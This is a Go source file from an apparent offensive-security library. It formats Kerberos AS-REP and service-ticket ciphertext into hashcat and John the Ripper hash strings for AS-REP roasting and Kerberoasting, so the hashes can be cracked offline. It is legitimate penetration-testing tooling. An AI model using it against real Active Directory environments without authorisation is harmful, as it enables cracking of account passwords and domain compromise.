// Package attacks provides the offensive-tooling surface built on the native
// Kerberos primitives: hashcat-compatible hash formatting for AS-REP roasting
// and Kerberoasting. The network operations live on the client
// (kerberos.ASREPRoast, KerberosClient.Kerberoast); this package turns their
// encrypted output into crackable hash strings.
package attacks

import (
	"encoding/hex"
	"fmt"

	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/iana"
)

// aesMacLen returns the truncated-HMAC length appended by an AES enctype's
// encrypt-then/over-MAC construction, which is where the crackable checksum sits
// in the ciphertext for AES Kerberoast/AS-REP hashes.
func aesMacLen(etype int) int {
	switch etype {
	case iana.ETypeAES128CTSHMACSHA196, iana.ETypeAES256CTSHMACSHA196:
		return 12
	case iana.ETypeAES128CTSHMACSHA256:
		return 16
	case iana.ETypeAES256CTSHMACSHA384:
		return 24
	default:
		return 0
	}
}

// splitCipher separates a KDC-REP encrypted part into the checksum and the
// remaining encrypted data, as the hashcat formats expect.
//
//   - RC4-HMAC (23): the ciphertext is checksum(16) || edata, so the checksum is
//     the first 16 bytes.
//   - AES: the ciphertext is edata || HMAC, so the checksum is the trailing
//     12/16/24 bytes depending on the enctype.
func splitCipher(etype int, cipher []byte) (cksum, edata []byte, err error) {
	switch etype {
	case iana.ETypeRC4HMAC:
		if len(cipher) < 16 {
			return nil, nil, fmt.Errorf("attacks: RC4 ciphertext too short (%d bytes)", len(cipher))
		}
		return cipher[:16], cipher[16:], nil
	case iana.ETypeAES128CTSHMACSHA196, iana.ETypeAES256CTSHMACSHA196,
		iana.ETypeAES128CTSHMACSHA256, iana.ETypeAES256CTSHMACSHA384:
		m := aesMacLen(etype)
		if len(cipher) < m {
			return nil, nil, fmt.Errorf("attacks: AES ciphertext too short (%d bytes)", len(cipher))
		}
		return cipher[len(cipher)-m:], cipher[:len(cipher)-m], nil
	default:
		return nil, nil, fmt.Errorf("attacks: unsupported etype %d for hash formatting", etype)
	}
}

// FormatASREPHash formats an AS-REP encrypted part as a hashcat AS-REP-roast
// hash. Only RC4 (etype 23) is supported: it yields the mode-18200 form
// "$krb5asrep$23$user@realm:<checksum>$<edata>".
//
// hashcat has NO AS-REP mode for AES enctypes — mode 18200 is RC4/etype-23 only,
// and the AES Kerberos modes cover TGS-REP (19600/19700), Pre-Auth (19800/19900)
// and the KDC database (28800/28900), not AS-REP. Emitting an "$krb5asrep$17/18$"
// string is therefore uncrackable (hashcat rejects it with a token-length error),
// so this function returns an error for any non-RC4 etype. Use
// FormatASREPHashJohn (John the Ripper), which does support AES AS-REP roasting.
func FormatASREPHash(username, realm string, etype int, cipher []byte) (string, error) {
	if etype != iana.ETypeRC4HMAC {
		return "", fmt.Errorf("attacks: hashcat has no AS-REP mode for etype %d; "+
			"hashcat AS-REP roasting supports only RC4 (etype 23, mode 18200) — "+
			"format AES AS-REP hashes with FormatASREPHashJohn (John the Ripper) instead", etype)
	}
	cksum, edata, err := splitCipher(etype, cipher)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s",
		username, realm, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
}

// FormatTGSHash formats a service ticket's encrypted part as a hashcat
// Kerberoast hash. RC4 (etype 23) yields the mode-13100 form
// "$krb5tgs$23$*account$realm$spn*$<checksum>$<edata>"; AES enctypes yield the
// mode-19600/19700 form "$krb5tgs$<etype>$account$realm$<checksum>$<edata>"
// (which carries no SPN, matching hashcat's format).
func FormatTGSHash(account, realm, spn string, etype int, cipher []byte) (string, error) {
	cksum, edata, err := splitCipher(etype, cipher)
	if err != nil {
		return "", err
	}
	if etype == iana.ETypeRC4HMAC {
		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
			account, realm, spn, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
	}
	return fmt.Sprintf("$krb5tgs$%d$%s$%s$%s$%s",
		etype, account, realm, hex.EncodeToString(cksum), hex.EncodeToString(edata)), nil
}
